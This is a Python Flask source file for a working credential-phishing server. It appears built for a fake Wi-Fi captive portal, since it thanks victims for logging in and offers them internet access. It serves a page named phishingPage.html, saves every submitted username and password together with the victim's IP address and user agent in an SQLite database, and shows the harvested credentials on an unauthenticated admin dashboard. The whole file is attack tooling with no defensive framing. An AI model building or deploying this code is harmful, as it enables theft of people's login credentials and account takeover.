from flask import Flask, render_template, request, redirect, url_for, jsonify
import sqlite3
import os

# Flask app setup
app = Flask(__name__)
app.config["TEMPLATES_FOLDER"] = "./templates/"


# Initialize database
def init_db():
    conn = sqlite3.connect("phishing_data.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        ip_address TEXT,
        user_agent TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    """)
    conn.commit()
    conn.close()


# Route for the phishing page
@app.route("/", methods=["GET", "POST"])
def phishing_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        ip_address = request.remote_addr
        user_agent = request.headers.get("User-Agent")

        # Store in database
        try:
            conn = sqlite3.connect("phishing_data.db")
            cursor = conn.cursor()
            cursor.execute("""
            INSERT INTO credentials (username, password, ip_address, user_agent)
            VALUES (?, ?, ?, ?)
            """, (username, password, ip_address, user_agent))
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"Database error: {e}")

        return "<h1>Thank you for logging in! Enjoy your internet access.</h1>"

    # Dynamic template rendering
    template_name = "phishingPage.html"
    return render_template(template_name)

@app.route("/remove-credential", methods=["POST"])
def remove_credential():
    try:
        # Get the ID from the POST request
        data = request.get_json()
        row_id = data.get('id')

        if row_id:
            # Connect to the database and remove the credential
            conn = sqlite3.connect("phishing_data.db")
            cursor = conn.cursor()
            cursor.execute("DELETE FROM credentials WHERE id = ?", (row_id,))
            conn.commit()
            conn.close()

            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'No ID provided'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Admin Panel
@app.route("/admin", methods=["GET", "POST"])
def admin_dashboard():
    if request.method == "POST":
        # Handle site configuration (e.g., template change)
        new_template = request.form.get("template")
        if new_template and os.path.exists(os.path.join(app.config["TEMPLATES_FOLDER"], new_template)):
            app.config["ACTIVE_TEMPLATE"] = new_template

    # Fetch statistics
    conn = sqlite3.connect("phishing_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM credentials")
    total_credentials = cursor.fetchone()[0]
    cursor.execute("SELECT DISTINCT ip_address FROM credentials")
    unique_ips = len(cursor.fetchall())
    cursor.execute("SELECT * FROM credentials")
    credentials = cursor.fetchall()
    conn.close()

    return render_template("admin_dashboard.html", total=total_credentials, ips=unique_ips, credentials=credentials)



# Start the app
if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
